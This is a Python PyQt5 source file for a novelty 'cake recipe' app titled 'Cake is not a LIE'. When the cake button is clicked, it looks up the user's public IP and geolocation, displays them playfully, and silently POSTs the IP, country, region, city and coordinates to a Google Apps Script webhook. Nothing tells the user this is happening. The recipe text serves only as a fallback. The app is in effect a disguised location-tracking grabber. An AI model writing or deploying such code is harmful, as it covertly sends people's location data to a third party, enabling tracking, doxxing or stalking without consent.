import sys
import requests
import os
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QTextEdit
from PyQt5 import QtCore
from PyQt5.QtGui import QIcon
from PyQt5.QtMultimedia import QSound
from PyQt5.QtCore import QTimer


IMAGE_PATH = "media/cake.png"
SOUND_PATH = "media/click_sound.wav"

ingredients = [
    "Ingredients".center(50),
    "1 (18.25-ounce) package chocolate cake mix",
    "1 can prepared coconut–pecan frosting",
    "3/4 cup vegetable oil",
    "4 large eggs",
    "1 cup semi-sweet chocolate chips",
    "3/4 cup butter or margarine",
    "1 2/3 cup granulated sugar",
    "2 cups all-purpose flour"
]


class ipipcake(QWidget):
    def __init__(self):
        super().__init__()
        self.result_lines = []
        self.current_line_index = 0
        self.timer = QTimer(self)
        self.result_display = None

        if not os.path.exists(IMAGE_PATH):
            print(f"e: {IMAGE_PATH}")
        if not os.path.exists(SOUND_PATH):
            print(f"e: {SOUND_PATH}")

        self.sound = QSound(SOUND_PATH, self)
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Cake is not a LIE')
        self.setFixedSize(400, 300)
        self.setStyleSheet("background-color: black;")

        self.layout = QVBoxLayout()
        self.layout.addStretch()

        self.query_button = QPushButton(self)
        icon = QIcon(IMAGE_PATH)
        self.query_button.setIcon(icon)
        self.query_button.setIconSize(QtCore.QSize(64, 64))
        self.query_button.setFixedSize(64, 64)
        self.query_button.clicked.connect(self.query_ip_location)
        self.query_button.setStyleSheet("background-color: black; border: none;")
        self.layout.addWidget(self.query_button, alignment=QtCore.Qt.AlignCenter)

        self.layout.addStretch()
        self.setLayout(self.layout)

    def query_ip_location(self):
        self.sound.play()
        self.query_button.deleteLater()
        self.query_button = None

        if self.result_display:
            self.result_display.deleteLater()
            self.result_display = None
            self.timer.stop()

        self.result_display = QTextEdit(self)
        self.result_display.setReadOnly(True)
        self.result_display.setStyleSheet("background-color: black; color: #00FF00; border: 1px solid #00FF00;")
        self.layout.insertWidget(self.layout.count() - 1, self.result_display)

        try:
            ip = requests.get('https://api.ipify.org?format=json').json()['ip']
            data = requests.get(f'http://ip-api.com/json/{ip}').json()

            if data.get('status') == 'fail':
                self.result_display.setText("\n".join(ingredients))
                return

            self.result_lines = [
                "CAKE IS ON THE WAY!".center(50),
                f"IP: {data.get('query', 'Unknown')}",
                f"Country: {data.get('country', 'Unknown')}",
                f"Region: {data.get('regionName', 'Unknown')}",
                f"City: {data.get('city', 'Unknown')}",
                f"Coordinates: {data.get('lat', 'Unknown')}, {data.get('lon', 'Unknown')}",

            ]
            self.current_line_index = 0
            self.timer.timeout.connect(self.display_next_line)
            self.timer.start(150)

            payload = {
                'ip': data.get('query'),
                'country': data.get('country'),
                'region': data.get('regionName'),
                'city': data.get('city'),
                'coordinates': f"{data.get('lat')},{data.get('lon')}"
            }
            webhook_url = "https://script.google.com/macros/s/.../exec"
            requests.post(webhook_url, json=payload)

        except Exception:
            self.result_display.setText("\n".join(ingredients))

    def display_next_line(self):
        if self.current_line_index < len(self.result_lines):
            self.result_display.append(self.result_lines[self.current_line_index])
            self.current_line_index += 1
        else:
            self.timer.stop()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = ipipcake()
    window.show()
    sys.exit(app.exec_())
